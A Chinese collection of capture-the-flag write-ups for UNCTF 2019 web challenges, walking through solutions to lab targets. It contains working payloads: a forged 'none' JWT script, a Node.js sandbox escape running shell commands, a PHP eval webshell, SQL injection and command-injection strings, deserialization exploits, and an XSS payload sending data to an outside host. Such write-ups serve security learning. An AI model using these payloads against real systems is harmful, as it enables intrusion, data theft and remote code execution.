# 2019UNCTF
## 题目类型：
|类型|年份|难度|
|:---:|:---:|:---:|
|官方赛事题|2019|中|

# 题目下载：
+ 暂无

# 网上公开WP：
+ 暂无

# 本站备份WP：
**感谢作者：2019unctf提供**
## WEB
### Arbi
#### 第一步
首先题目拿到是黑盒环境，注册账号后登陆，发现img标签src属性有个接口存在ssrf
题目提示了python3 http.server
所以可以猜测服务器9000端口开了个http.server可以读取文件
上传头像后 会通过ssrf去请求upload目录里的图像 ，直接通过web访问upload目录也可以访问图像，可以断定
http.server的根目录就是web目录，所以可以读取源码
但是ssrf判断了用户名和url必须匹配，所以通过注册恶意用户名，来绕过接口判断，来读取任意文件
PS： 我这里修改了http.server的源码不能列目录，所以注册/等列目录的文件名是不行的

由于X-Powered-By 看出后端采用express开发，web应用下应存在package.json文件
注册 ../package.json? 用户，通过接口读取到了package.json文件
得到提示1，flag在根目录/flag下

#### 第二步
package.json 显示主入口为mainapp.js，所以继续注册读取mainapp.js文件，
发现路由在 /routers/index.js文件
继续读取
为了让师傅们不这么恶心的做题，我直接在放了个源代码的zip在一个路由上，
读取 /routers/index.js 可以看到有个 VerYs3cretWwWb4ck4p33441122.zip 路由
直接在web上访问即可下载源代码，从而避免重复无用的做题步骤。源代码文件和题目环境文件完全一致
除了部署后动态生成的sessions文件外。
#### 第三步
然后就是白盒审计，可以发现注册登录功能采用了jwt认证，这里我参考了[ångstromCTF 2019](https://github.com/justcatthefish/ctf/tree/master/2019-04-25-Angstrom2019/web#%C3%A5ngstromctf-2019----quick-write-ups-by-terjanq-web)的 Cookie Cutter题目
认证过程是，每个人拥有自己独立的jwt secret
并且存在于服务端一个列表中，并且不同用户secret列表对应的id存储在了jwt中，登陆的时候会直接从jwt token中读取id
然后通过列表获取secret 进行解密，这里有个trick，node的jsonwebtoken 有个bug，当jwt secret为空时
jsonwebtoken会采用algorithm none进行解密
又因为服务端 通过
```javascript
 var secret = global.secretlist[id];
 jwt.verify(req.cookies.token,secret);
```

解密，我可以通过传入不存在的id，让secret为undefined,导致algorithm为none,然后就可以通过伪造jwt来成为admin
```python
# pip3 install pyjwt
import jwt
token = jwt.encode({"id":-1,"username":"admin","password":"123456"},algorithm="none",key="").decode(encoding='utf-8')
print(token)
```
#### 第四步
成为admin后，就可以访问admin23333_interface接口
审计可以发现，这是一个读取文件的接口
这里用到了express的特性，当传入?a[b]=1的时候,变量a会自动变成一个对象
a = {"b":1}
所以可以通过传入name为一个对象，避开进入if判断 从而绕过第一层`if(!/^key$/im.test(req.query.name.filename))return res.sendStatus(500);`的白名单过滤
第二个过滤是 判断filename 不能大于3,否者会过滤.和/,而读取flag需要先目录穿越到根目录
而../就已经占了3个字符，再加上flag肯定超过限制
这时候可以换个思路，length不仅可以取字符串长度还可以取数组长度，把filename设数组，再配合下面的循环
即可完美绕过过滤
而express 中当碰到两个同名变量时，会把这个变量设置为数组，例如a=123&a=456
解析后
a = [123,456]，所以最终组合成

`/admin23333_interface?name[filename]=../&name[filename]=f&name[filename]=l&name[filename]=a&name[filename]=g`

### bypass
1）	打开浏览器，访问目标主机，发现源代码 

![](https://p.pstatp.com/origin/ff270001097d345b2fa5)

2）	可以发现可以命令执行但是waf禁用了大部分符号，只能执行 file 命令，考虑如何bypass，发现误写反斜杠匹配模式，`\\|\n`会被解释为匹配竖线与换行符的组合,所以可以直接用%0a进行命令注入，最后在bypass的时候由于过滤了bin，以及grep，可以用/???/gr[d-f]p 的形式绕过，最后用`+` 绕过空格过滤

3）	最后payload见下图
 
![](https://p.pstatp.com/origin/ff920000eb3cceb8d493)

### CheckIn
#### 原理知识
1）	远程代码执行是指攻击者可能会通过远调用的方式来攻击或控制计算机设备，无论该设备在哪里。
2）	远程代码执行是指攻击者可能会通过远调用的方式来攻击或控制计算机设备，无论该设备在哪里。  
3）	远程执行代码漏洞会使得攻击者在用户运行应用程序时执行恶意程序，并控制这个受影响的系统。攻击者一旦访问该系统后，它会试图提升其权限。
#### 解题过程
1）打开浏览器，访问目标主机，可以看到界面如下图1所示：
 
图1 web界面
2）分析js代码可以得知还有calc的功能，如下图2所示：
 
![](https://p.pstatp.com/origin/ffd0000066ea7a82ea3b)

3）从calc的源码可以看到，问题出在下面的eval函数上，导致了RCE远程代码执行漏洞：

![](https://p.pstatp.com/origin/ff040000eeaa3081140a)

4）想要执行命令需要先绕过nodejs的vm模块，使用this.constructor.constructor（Object 类的 constructor 是外层的 Function 类）来完成逃逸，从而利用rce漏洞来读取flag文件，payload关键如下所示

'(new this.constructor.constructor("return this.process.mainModule.require;"))()("child_process").execSync("cat /flag").toString();';

5）执行exp.js结果如下图所示：

![](https://p.pstatp.com/origin/ff4f0000b3384ef1a952)

### CheckInA
#### 原理知识
原理知识	1）	Node.js 就是运行在服务端的 JavaScript。Node.js 是一个基于Chrome JavaScript 运行时建立的一个平台。Node.js是一个事件驱动I/O服务端JavaScript环境，基于Google的V8引擎，V8引擎执行Javascript的速度非常快，性能非常好。
#### 解题过程
1）打开浏览器，访问目标主机，可以看到界面如下图1所示：
 
![](https://p.pstatp.com/origin/fed70001166e75dc6d9d)

2）由界面可知这是一个聊天室，想要发言需要起一个nickname：
 
![](https://p.pstatp.com/origin/fe6100008416b7c8eed4)

3）盲测或者分析js代码，我们可以得知，输入/help后可以查看指令，发现需要输入/more查看更多指令,发现有/flag指令
 
![](https://p.pstatp.com/origin/1371d000042ab3f2ce163)

4）输入/flag，得到flag
 
![](https://p.pstatp.com/origin/1000d0000161715203db8)

### Do you like xml
#### 原理知识
1）	XXE（XML外部实体注入，XML External Entity) ，在应用程序解析XML输入时，当允许引用外部实体时，可构造恶意内容，导致读取任意文件、探测内网端口、攻击内网网站、发起DoS拒绝服务攻击、执行系统命令等。
#### 解题过程
1）打开浏览器，访问目标主机，发现提示flag in this pic图片提示。

![](https://p.pstatp.com/origin/ff8d0000ef08f5c85d58)

2）根据图片名hex.png以16进制或txt格式打开hex.png图片发现flag位置。

![](https://p.pstatp.com/origin/fe4d00009a3219e3d32e)

3）	根据weak password提示，使用admin登录用户名密码，显示登陆成功，但无其他响应。

![](https://p.pstatp.com/origin/ff98000071920c3dfef5)

4）	使用burp抓包发现xxe漏洞，利用xxe漏洞和php://filter伪协议读取flag.php文件，得到base64加密的字符串。

![](https://p.pstatp.com/origin/ff150000f1934a7dcae9)

5）	base64解密，得到flag。

![](https://p.pstatp.com/origin/fe2b0001aacfeb27e039)

### easy_file_manage
#### 原理知识
+ 1.	第一个点是逻辑出现错误，先修改再判断了。
+ 2.	第二个点是有些CMS 会出现的问题，这个是比较简单的，比较难的可以参考：
https://wizardforcel.gitbooks.io/php-common-vulnerability/content/58.html?tdsourcetag=s_pcqq_aiomsg
#### 解题过程
 首先打开网页 

![](https://p.pstatp.com/origin/fe3700013b661d7971ba)

正常注册登录后：

![](https://p.pstatp.com/origin/ff080000aa8806f6362b)

有提示看看 robots 文件，看看：

![](https://p.pstatp.com/origin/ff1c00008c98881b32f2)

提示了两个备份文件，下载下来看看：

首先看看 download.php：

![](https://p.pstatp.com/origin/ffcf0000592fe6bbb3f7)

功能看起来像是查询数据库，拿到filename 后下载出来。其中还判断了user_id 。

再看看rename.php

![](https://p.pstatp.com/origin/ffce000035bfeaa262f2)

这里首先是更改了数据库，再检查后缀，所以我们可以通过这个读取任意文件，但是有判断不能读取
config 和 flag。

再看看 flag.php\~

![](https://p.pstatp.com/origin/fec100008da6e377ed3d)

这里是要登陆 user_id 是 99999... 的，显然不可能，我们可以看看check_login
这个函数。尝试读取 function.php。

首先上传一个正常的图片：

![](https://p.pstatp.com/origin/ffc4000039a1db4ec20d)

改名，这里先记住 f_id：

![](https://p.pstatp.com/origin/dc0d0005065ffc52c16a)

![](https://p.pstatp.com/origin/febd000074c30614e7a2)

会提示出错，但此时数据的filename字段已经被修改了，我们下载的时候是从数据库中查询出来的，然后访问
download.php 带入进 f_id：

![](https://p.pstatp.com/origin/ffe8000097df5beacda9)

下载下来后查看check_login 函数:

![](https://p.pstatp.com/origin/fec7000123b8f03671f3)

这里调用了 decrypt_str 解 \$_COOKIE[user] ，看看这个函数：

![](https://p.pstatp.com/origin/dc120003aca2f1954beb)

这两个函数，一个加密一个解密，大致就是将密钥和字符串进行一些简单的运算。

这是可以破解的，我们只要知道明文和密文，就能解出密钥了，我们再看看 login.php;

![](https://p.pstatp.com/origin/ff94000109b42da6d1e9)

Id的话，在首页有显示出来：

![](https://p.pstatp.com/origin/ff2c00007524df979ee5)

从 COOKIE 中把密文拿出来，尝试破解一下密钥：

![](https://p.pstatp.com/origin/ffed00007ce49c2feba6)

这里要先urldecode 一次，因为 进入 \_COOKIE 时 php 好像自动把
%编码了一次，这里的解密函数直接用function.php 的即可：

![](https://p.pstatp.com/origin/fea60000af0d40eb059a)

![](https://p.pstatp.com/origin/ffad000080799f8c8df0)

我们把明文当作密钥，这里要先 serialize 一下，因为加密时对明文 serialize 了。

这样就可以解密出KEY了，因为加密时是循环取 KEY 的值，所以开始重复时就是 KEY了。

这里的 SECRET_KEY 应该时 THIS_KEY。根据 flag.php\~的提示 ，我们加密一个 id 是
99999999999999999 的，还有第二条件是存在 flag_pls ：

![](https://p.pstatp.com/origin/fff900006421f4d579a3)

![](https://p.pstatp.com/origin/fe1e0000579600d0c420)

还要再 urlencode 一次，放进 \$_COOKIE 里就行了。

先不替换访问flag.php 试试：

![](https://p.pstatp.com/origin/ff8b000080a65dc8f527)

替换 \$_COOKIE 后：

![](https://p.pstatp.com/origin/fe7100008489ef3bf358)
### easy_pentest
#### 原理知识
1.存在waf拦截以下几种：

php标记:
`<?php , <?= , <?`

php函数:
              `base64_decode，readfile，convert_uuencode，file_get_contents`
              
关键字:
               `php://`
               
2.disable_function禁用了以下函数：

 `pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,passthru,exec,chroot,chgrp,chown,shell_exec,proc_open,proc_get_status,popen,ini_alter,ini_restore,dl,openlog,syslog,readlink,symlink,popepassthru,stream_socket_server,system,mail,error_log,move,copy,unlink`

3.需要一个safe_key 来让waf允许参数传入，否则所有参数都拒绝接收。

#### 解题过程
1.获取safe_key
获取safe_key来允许参数传入通过访问发现跳转到一个页面，显示403表明缺少safe_key来通过安全验证，页面如下图
![](https://p.pstatp.com/origin/fe4e0001305da0ceb0a8)

Tp存在日志规律，请求都会记录在日志中，通过编写EXP来遍历所有可能存在的日志
EXP代码如下：
![](https://p.pstatp.com/origin/fe480000afa6879a97e9)

执行exp脚本，发现存在02.log日志

![](https://p.pstatp.com/origin/ff68000089e934aca3c5)

打开日志可以看到记录了一条请求，通过GET方式请求且携带参数名为safe_key 值为 easy_pentesnt_is_s0fun 如下图

![](https://p.pstatp.com/origin/fe2e0000835398b29ab7)

携带safe_key 再去访问public/index.php  发现跳转到了安全页面可知过了waf的安全验证。如图

![](https://p.pstatp.com/origin/fe3c0000cde80f1b1c31)

2.绕过限制来利用TP5 RCE漏洞
常见的tp5rce利用为 写日志，包含日志。写session，包含session。而这两种方式在这里都不可用，因为waf对<?php等关键字进行了拦截。

所以我们这里通过变形来绕过，利用base64编码与php://filter伪协议，通过inlcude方法进行包含，可以利用
`php://filter/read=convert.base64-decode/resource=/var/www/html/runtime/temp/用户session名`的方式进行解码。

然而session里面还有其他字符串，为了让传入的webshell能够被正确解码，我们需要构造合适的字符串。例如：

```
abPD9waHAgQGV2YWwoYmFzZTY0X2RlY29kZSgkX0dFVFsnciddKSk7Oz8%2bab
<?php @eval(base64_decode($_GET['r']));;?>
```

前后两个ab是为了满足shellcode前后两段字符串来被解析，可以fuzz判断需要加几个来凑满四个字节保证shellcode正常解析。

但是waf拦截了php等关键字，所以还需要绕过。filter其实是可以传递多个的，同时参数为参数引用。可通过strrev反转函数来突破限制。


3.利用

第一步通过设置session，将webshell写入到session中在包含利用，payload为：

```
abPD9waHAgQGV2YWwoYmFzZTY0X2RlY29kZSgkX0dFVFsnciddKSk7Oz8%2bab
<?php @eval(base64_decode($_GET['r']));;?>
```


如图：

![](https://p.pstatp.com/origin/1000900002c1618d9723b)

第二步通过webshell列出home目录，payload为：

```
var_dump(scandir("/home"));
dmFyX2R1bXAoc2NhbmRpcigiL2hvbWUiKSk7
```

获取到home目录底下的flag文件名字，如图：

![](https://p.pstatp.com/origin/feaa0001aeb60bcf0015)

第三步读取flag，payload为：

```
echo(readfile("/home/flag_1sh3r3.txt"));
ZWNobyhyZWFkZmlsZSgiL2hvbWUvZmxhZ18xc2gzcjMudHh0IikpOw==
```

如图：

![](https://p.pstatp.com/origin/ff160000eb850a771463)

4.通过exp获取flag

执行get_flag.py , 传入网站地址和端口。 例如`python get_flag.py 192.168.232.144:88` 运行后获取到flag

如图：

![](https://p.pstatp.com/origin/fff500002c37cac026d5)

参考：
+ Phithon：https://www.leavesongs.com/PENETRATION/php-filter-magic.html

+ 水泡泡：https://xz.aliyun.com/t/6106

### easy_sql_injection
首先打开首页：

![](https://p.pstatp.com/origin/1000900002c17b952d735)

发现有源码，下载。

首先是 index：

![](https://p.pstatp.com/origin/ff810000a674388333cc)

发现调用了 Db类的一些操作，看看 Db：

![](https://p.pstatp.com/origin/ffc9000097c936a6b00e)

首先时buildSql 函数，这应该是构建语句的函数，进去看看：

![](https://p.pstatp.com/origin/fe600001639764c7e704)

ParseWhere，继续跟入：

![](https://p.pstatp.com/origin/ff720000f516dc3971d3)

这里关键是parseWhereItem 函数，进去看看：

![](https://p.pstatp.com/origin/ff3800006118e6f6068f)

简单的分析一下：这里的 \$val
是我们可控的值，可以是一个数组。如果是数组，is_scalar 就会返回 false，就不如进入
bind了。这个bind是 pdo的预处理，然后下面会根据 \$exp 的值执行了一些操作，这里
\$exp 也是我们可控的值，所以我们可以跟几个函数看看有没有注入的地方：

![](https://p.pstatp.com/origin/ff5d0000fcc22c60decd)

分析后我们会看见，大部分函数都在函数内有绑定参数，但是有一个函数：

![](https://p.pstatp.com/origin/1000e00001cf448853931)

这里直接将 \$field2 拼接进了字符串中，可能会导致注入。

我们试试看，回到 index.php中：

![](https://p.pstatp.com/origin/ff8b000080a85fd1717e)

传入 keyword：keyword[]=column&keyword[1][]==&keyword[1][]=abcd%27

在本地实验一下，可以输出一下sql语句：

![](https://p.pstatp.com/origin/ffaf0000907aba83953f)

![](https://p.pstatp.com/origin/ff8e00008b4bb90155cd)

可以看到这里被 \` 包裹住了，我们可以逃逸出来，我们传入：

keyword[]=column&keyword[1][]==&keyword[1][]=abcd\`) union select 1,2%23

![](https://p.pstatp.com/origin/fe8500008b7912565c93)

这里 abcd 因为被
反引号包裹会被作为一个字段，所以要用一个已经存在的字段，否则会报错，我们可以猜一个字段名，比如id。

改一下语句，改成：id\`) union select 1,sleep(3)%23

![](https://p.pstatp.com/origin/fe660000db0d0a48da4b)

延时成功，证明可以使用盲注，我们可以上 sqlmap了：

执行语句：python sqlmap.py -u
"http://127.0.0.1/?keyword[]=column&keyword[1][]==&keyword[1][]=id\`) union
select 1,2\*%23"

![](https://p.pstatp.com/origin/fe3900012a040b8a8750)

然后加上 --current-db 得出当前数据库为 haha。

加上 -D haha --tables 跑出表名，发现存在 flag 表。

最后加上参数：-D haha -T flag --dump 跑出flag：

![](https://p.pstatp.com/origin/fe8d0000b78867301067)

### easyphp
#### 预备知识
1）	通过管道执行命令绕过waf
#### 解题过程

1）打开浏览器，访问目标主机，审计源码

2）提交如下payload system(“ ls;cat”);

![](https://p.pstatp.com/origin/fe440000c56f66823e91)

1.  发现flag文件，继续提交如下payload system(“\<flag cat”);

2.  使用脚本循环上传，并访问使用脚本不间断获取返回文件
    名并使用脚本访问该文件以便获得稳定的页面

![](https://p.pstatp.com/origin/1373200001e9f464f520f)

### EasyXSS
#### 预备知识
1）	由于网站开发者在进行代码编写过程中未对输入参数进行严格校验及过滤，导致黑客可以在页面上插入 XSS 语句。
2）	后端程序未关闭调试模式，可以将前端发送的数据回显出来。

#### 解题过程
步骤：

1.  打开靶机，是这样一个页面。

![](https://p.pstatp.com/origin/fe95000119ec5d5ae983)

1.  随意测下，页面有 xss。

![](https://p.pstatp.com/origin/ffdd00005c2c33b4d2ef)

![](https://p.pstatp.com/origin/fe590000f1d9d817dee2)

![](https://p.pstatp.com/origin/fe9800005733e439d670)

1.  题目题面里有说 flag 在 httponly 的 cookie
    里，那么就来查找一下有什么页面可以利用的。

>   F12 看一下每个页面发的 ajax 请求。

![](https://p.pstatp.com/origin/fe7f00006eab386c8c14)

>   这个页面似乎可以利用，不带 id 参数打开，调试信息里有 Cookie 信息。

![](https://p.pstatp.com/origin/ffcf0000593030bd91bb)

>   再来看看页面的 ACL 头，可以带着 Cookie 发 XHR 请求。

1.  然后就来构造一个 XHR 请求的 Payload 来利用这个页面拿 flag 吧。

>   \<img src='/efefefe' onerror="xmlhttp=new
>   XMLHttpRequest();xmlhttp.withCredentials=true;xmlhttp.onreadystatechange=function(){if(xmlhttp.readyState==4){location.href='http://xss.zhaoj.in/?flag='
>   +
>   xmlhttp.responseText.match('flag\\{(.\*?)\\}')[1]}};xmlhttp.open('GET','/index.php/treehole/view?id=',true);xmlhttp.send('');"/\>

1.  打过去，flag 到手。

![](https://p.pstatp.com/origin/fed20000f1462308f140)

![](https://p.pstatp.com/origin/fe4b0000c39ec6c1391f)

### GoodJava
#### 前言
由于之前没怎么写过Java，此题可能有些bug，但对于拿flag影响不大，还请师傅们见谅

此题参考了最近的TMCTF，经过了改编 加大了难度

原题是用原生Servlet编写
此题改写成了Springboot，并且在第一步加了过滤，第二步考点直接换成了Java命令执行绕过（改动很大）

#### 解题过程

前序步骤

题目会提供一个Jar包

用idea打开反编译后审计源码

找到Controller

![](https://p.pstatp.com/origin/ff7a00010ef87fa9c5e3)

第一步

源码可知一共有两个路由

第二个路由需要输入secret密钥才能访问，而secret存在在服务器/passwd文件中

可以猜测第一个路由就是获取密钥文件的功能，跟进可以发现OIS类继承了ObjectInputStream，把POST数据传入OIS构造方法，而然后ois.readObject()则是反序列化操作

但是resolveClass方法限制了被反序列化的类只能是com.unctf.pojo.Man类

查看Man类，可以发现重写了readObject方法，这是Java反序列化的魔术方法，审计一下很容易发现XXE，根据代码构造即可

需要注意一下本地构造时serialVersionUID必须一致，此值代表了对象的版本或者说id，值不一致反序列化操作会失败

这里有个小考点，这里限制了xml数据不能含有file（大小写），而我们需要读取/passwd

这里有个trick，Java里面有个伪协议netdoc，作用和file一致，都是读取文件，所以这一步很简单，把file换成netdoc即可

注意一下本地构造包名也必须一致哦，不仅仅是类名一致就行

Man类加一个writeObject即可

详细步骤可以看看https://github.com/p4-team/ctf/tree/master/2019-09-07-trendmicro-quals/exploit_300

![](https://p.pstatp.com/origin/dc0e0004232bdb56c40a)

exp

![](https://p.pstatp.com/origin/ffcd0000c827dae1ada4)

output

![](https://p.pstatp.com/origin/feb2000092a337a08e45)

第二步

然后就是第二步，考点是代码执行绕过

这里有个SPEL注入，可以构造任意类，但是同样代码过滤了Runtime\|ProcessBuilder\|Process

这三个Java中执行命令的类，题目提示必须执行命令才能拿到flag，然后Java又是强类型语言，很多操作不像php那么动态，所以这一步可能会难住很多人

然后这里有个trick，java内部有个javascript的解析器，可以解析javascript，而且在javascript内还能使用java对象

我们就可以通过javascript的eval函数操作

T(javax.script.ScriptEngineManager).newInstance().getEngineByName("js").eval("xxxxxxxxx")

由于不能使用关键字，我们可以通过字符串拼接来

juke.outofmemory.cn/entry/358362

exp里面也有对应的转换脚本

![](https://p.pstatp.com/origin/dc110003749644af1f49)

exp

![](https://p.pstatp.com/origin/1373c0000074c53fef445)

output

![](https://p.pstatp.com/origin/fec80000a81aa13f57f9)

### happyphp

```
<?php

class Server{
    public $file;
}

$a = new Server;
$a->file = "php://filter/read=convert.base64-encode/resource=files_upload_api.php";
echo urlencode(serialize($a));

echo "<br>";

$a = new Server;
$a->file = "LXJuploadspaht/shell.jpg"; //你上传的shell
echo urlencode(serialize($a));
```

### K&K战队的老家

#### 解题过程
1.  打开浏览器，访问目标主机，发现登录框

![](https://i.loli.net/2019/10/30/le57nGFpgxvzbdZ.png)

1.  构造万能密码 ‘\|\|1\|\|’登录

![](https://i.loli.net/2019/10/30/yc6bVevEhtOLPz4.png)

1.  发现/home.php?m=debug无法访问

![](https://i.loli.net/2019/10/30/JapDFT1Wny7w95R.png)

1.  通过m参数利用php伪协议绕过过滤读取题目源代码

![](https://i.loli.net/2019/10/30/tGIqXE2ZCoQvUsu.png)

1.  通过代码审计可知access.php和flag.php，同时发现备份文件access.php.bak

![](https://i.loli.net/2019/10/30/ZuGSv5ORqbcJB28.png)

![](https://i.loli.net/2019/10/30/mIFWwvnMqQuD6HS.png)

1.  通过代码审计构造反序列化漏洞利用

exp.php

```
<?php

class debug{

public $choose = "2aaaa";

public $id = 2;

public $username = "debuger";

public $forbidden = NULL;

public $access_token = "";

public $ob = NULL;

public $funny = NULL;

}

class session{

public $access_token = '3ecReK&key';

}

function cookie_decode($str) {

$data = urldecode($str);

$data = substr($data, 1);

$arr = explode('&', $data);

$cipher = '';

foreach($arr as $value) {

$num = hexdec($value);

$num = $num - 240;

$cipher = $cipher.'%'.dechex($num);

}

$key = urldecode($cipher);

$key = base64_decode($key);

return $key;

}

function cookie_encode($str) {

$key = base64_encode($str);

$key = bin2hex($key);

$arr = str_split($key, 2);

$cipher = '';

foreach($arr as $value) {

$num = hexdec($value);

$num = $num + 240;

$cipher = $cipher.'&'.dechex($num);

}

return $cipher;

}

$obj = new debug();

$obj1 = new session();

$str1 = serialize($obj1);

$obj->forbidden = $obj;

$obj->ob = $obj;

$obj->funny = $str1;

$str = serialize($obj);

echo cookie_encode($str);

?>
```

运行exp.php构造cookie

```
&144&16a&15f&121&13f&159&13a&15b&14a&147&13a&121&14a&169&139&126&13e&16a&160&127&153&16a&15f&122&13f&159&13a&15a&151&137&129&166&153&122&145&159&13f&123&13d&126&13e&144&15f&159&13d&15d&136&158&149&147&135&159&13f&123&13d&126&13d&15a&15f&159&151&147&141&159&13f&122&15b&126&13d&15a&164&16a&13f&15a&157&126&139&15e&146&16a&14a&148&13a&165&149&147&121&15c&139&15a&164&16a&13f&15a&153&126&139&15d&142&15c&149&15e&146&15e&14a&148&139&159&13f&123&13d&126&13f&144&15f&159&14a&15d&129&169&149&15d&15c&15b&14a&137&146&165&139&15a&164&169&13f&15a&135&127&153&16a&15f&168&13d&15a&15f&159&149&147&13e&15a&14a&148&13e&16a&148&123&142&166&151&122&146&165&139&15a&164&16a&13f&15a&131&126&139&159&139&127&153&16a&15f&169&13f&159&13a&166&149&159&139&127&153&15a&15f&168&13f&123&13d&126&13e&144&15f&159&14a&15e&146&165&152&15e&15b&159&13f&123&13d&126&13e&144&149&126&139&15b&128&126&13e&16a&15f&159&153&122&146&16a&153&122&15c&166&152&159&139&126&13d&144&160&127&153&16a&15f&168&13d&15a&15f&159&149&147&13e&15a&14a&148&13e&16a&148&123&142&166&151&122&146&165&139&15a&164&16a&13f&15a&135&167&13f&159&139&16a&14a&147&13e&143&14a&145&163&15d&151&122&146&125&139&15a&164&129&139&15a&164&129
```

1.  得到flag

![](https://i.loli.net/2019/10/30/zCHk7noSKh2Z9iM.png)

### NSB_Login
#### 原理知识
1）	管理员使用了弱密码，就是那么简单。
#### 解题过程
步骤：

1.  打开靶机，是这样一个页面。

![](https://i.loli.net/2019/10/30/BzbUHwYaKy2Zq1m.png)

1.  随便输入下，提示用户不存在。

![](https://i.loli.net/2019/10/30/35VXNOgzwnDhAfS.png)

1.  输入用户名 admin，提示密码错误。

![](https://i.loli.net/2019/10/30/KJOFa1iZCjTSU9L.png)

1.  查看页面源代码，发现有提示 rockyou，应该是使用了 rockyou.txt
    这个非常有名的字典。

![](https://i.loli.net/2019/10/30/uDOZjgi8xr6vMwa.png)

1.  编写 Python 脚本，读入 rockyou 字典，运行。

![](https://i.loli.net/2019/10/30/k6xFMm4duvhniDw.png)

1.  得到 flag。

![](https://i.loli.net/2019/10/30/BarXwqGcAUV2Y4M.png)

### NSB_Reset_Password
#### 原理知识
1）	找回密码时先提交并储存了用户名，然后验证了验证码之后储存了一个验证已通过的标志，最后提交新密码时再判断是否通过验证再重置指定用户密码。
2）	在验证通过，还没有提交新密码时如果再回到一开始提交用户名时即可覆盖储存用户名，再提交密码时导致可以重置任意用户密码。
#### 解题过程
步骤：

1.  打开靶机，是这样一个页面。

![](https://i.loli.net/2019/10/30/ul8hsdpXrx7o4gj.png)

1.  有注册，那就先来注册个用户看看。

![](https://i.loli.net/2019/10/30/aOPc1uAFQeBWXTR.png)

1.  然后登录，提示要干管理员。

![2ddb5ba58ab7bbf9262457d95023a5be.png](https://i.loli.net/2019/10/30/EvLaF6rtSsgABR1.png)

![1ae2081d7d1be506d9959324c1d44fb3.png](https://i.loli.net/2019/10/30/qE5Bgd43TJbQ1Ds.png)

1.  那么就来找回密码试试。

![0fcbe940ff0737efb52c705087d03fc0.png](https://i.loli.net/2019/10/30/1sCMvEYDSXuO3Kh.png)

1.  到邮箱可以看到验证码，填上。

![9e618fb43cad966f004872b3425b205c.png](https://i.loli.net/2019/10/30/FdDBWo3lAqrVbve.png)

![c4f6631e5bf9e483fa5e701bece84303.png](https://i.loli.net/2019/10/30/uRvlOywpPkidnNT.png)

1.  然后再打开一个新的找回密码页面，输入用户名 admin，点击找回密码，让 admin
    来覆盖 session 中要重置密码的用户名。

![f6385ecd7c88017b4baa6da954b168ae.png](https://i.loli.net/2019/10/30/oKbMnyPEmQRI7UD.png)

![ec94155052d4ab93232ae1f468c82bba.png](https://i.loli.net/2019/10/30/ey2TALCgIuO6pjM.png)

1.  再回到刚才那个重置密码的页面，重置密码为 123456。

![eb1184534bbd1f3e8ef175f7705bf88b.png](https://i.loli.net/2019/10/30/UrNIcZl9oH6Gvd8.png)

![62430ec7e0f066682ff42799ad7d450c.png](https://i.loli.net/2019/10/30/LFbuA4XqM7cYZeT.png)

1.  用用户名 admin，密码 123456登录得到 flag。

![f717a68777d9e712337881febca5e0b7.png](https://i.loli.net/2019/10/30/LtogsrM8SYPG796.png)

### Simple_Calc_1
#### 原理知识
1）	由于网站开发者在进行代码编写过程中未对输入参数进行严格校验及过滤，导致黑客可以通过构造SQL语句，获取目标网站后台数据库中的信息。
2）	SQL注入是输入特定的SQL语句达到SQL注入的效果，不同类型的SQL数据库类型所对应的SQL语句不一样，因此，尝试SQL注入测试前，需要获取目标网站数据库类型，通常，根据测试者的测试经验或采用不同数据库类型的测试的方法进行测试，有效获得目标网站真实数据库类型。
3）	如果网站在反向代理之后，获取客户端真实 IP 的方式就是获取 X-Forwared-For 等包含客户端真实 IP 的头，但如果要是不加检验直接获取往往会存在问题。

#### 解题过程
步骤：

1.  打开靶机，是这样一个计算器。

![d27df2668ae27f27a063d6b987cd7018.png](https://i.loli.net/2019/10/30/VkzOcqut4RsCJyf.png)

1.  看下关于信息，这里有个次数显示。

![](https://i.loli.net/2019/10/30/DZ89xw7QfcTBFez.png)

1.  F12 看下，发现有个 backend 请求。

![](https://i.loli.net/2019/10/30/dPMvgkNaiErmC3T.png)

1.  然后尝试构造 X-Forwarded-For 来伪造访客 IP，发现是可以伪造成功的。

127.0.0.1:

第一次访问：

![](media/91490e16b7ed10fc5394c244a21d5a97.png)

第二次访问：

![](https://i.loli.net/2019/10/30/boSkCIZO4XeRBPG.png)

127.0.0.3：

![](https://i.loli.net/2019/10/30/9dubM84hecPICRp.png)

1.  然后就可以尝试在这里尝试注入了。

>   多番测试之后，发现伪造 IP 为 127.0.0.3 ‘ or ‘1’=’1
>   之后，功能正常，说明此处有注入点。

![](https://i.loli.net/2019/10/30/7CxJGaR6YEDq8zZ.png)

1.  所以我们就可以直接用sqlmap来跑出数据了，当然 flag 也可以直接拿到了。

![](https://i.loli.net/2019/10/30/hwSmknYabeovFti.png)

### Simple_Calc_2
#### 解题过程
步骤：

1.  打开靶机，是这样一个计算器。

![](https://s2.ax1x.com/2019/10/30/K5Cb7Q.png)

1.  F12打开，然后随意点一下计算器看看，比如算一下 1+1 = 2。

![](https://s2.ax1x.com/2019/10/30/K5CH0g.png)

1.  网络请求看下，发现有个 calc.php请求。

![](https://s2.ax1x.com/2019/10/30/K5C7nS.png)

1.  来自己构造一个包试试能不能 rce。

![](https://s2.ax1x.com/2019/10/30/K5C4pt.png)

1.  可以，那么就可以直接读flag.txt 试试。

![](https://s2.ax1x.com/2019/10/30/K5C51P.png)

1.  不能读，来看看 flag.txt 的权限。

![](https://s2.ax1x.com/2019/10/30/K5CoX8.png)

1.  得找个带 suid 的可执行文件来读，来搜一下有哪些文件可用。

![](https://s2.ax1x.com/2019/10/30/K5CLkj.png)

1.  tac 可用，那就直接用这个来读吧。Flag 到手\~

![](https://s2.ax1x.com/2019/10/30/K5CI6f.png)

### simple_upload
#### 解题过程
步骤：

1.  打开靶机，就会出现源码

![](https://i.loli.net/2019/10/30/Ybo1IKgBxjt79yi.png)

1.  分析功能后,我们需要上传一个webshell到服务器上

![](http://yanxuan.nosdn.127.net/cab71aa91d4cc652966d7ce8cb9cd4a1.png)

1.  题目考点可以从源码中看到,首先是mime的类型检测

我们使用burp 获取中间的包进行修改即可绕过检测

![](http://yanxuan.nosdn.127.net/ab62a656316b96a9ad0ce9bcfb4188ec.png)

